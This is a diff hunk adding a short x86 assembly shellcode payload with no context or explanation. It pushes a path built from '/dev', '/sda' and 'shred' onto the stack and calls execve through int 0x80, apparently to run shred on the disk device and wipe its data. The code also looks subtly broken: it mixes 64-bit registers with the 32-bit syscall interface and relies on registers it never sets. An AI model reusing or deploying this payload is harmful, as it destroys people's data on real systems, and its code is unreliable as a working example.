@@ -1,0 +1,15 @@
+xor    eax,eax
+push   rax
+pushw  0x6465
+push   0x7268732f
+push   0x6164732f
+push   0x7665642f
+mov    ebx,esp
+push   rax
+push   rbp
+push   rdi
+push   rsi
+push   rbx
+mov    ecx,esp
+mov    al,0xb
+int    0x80
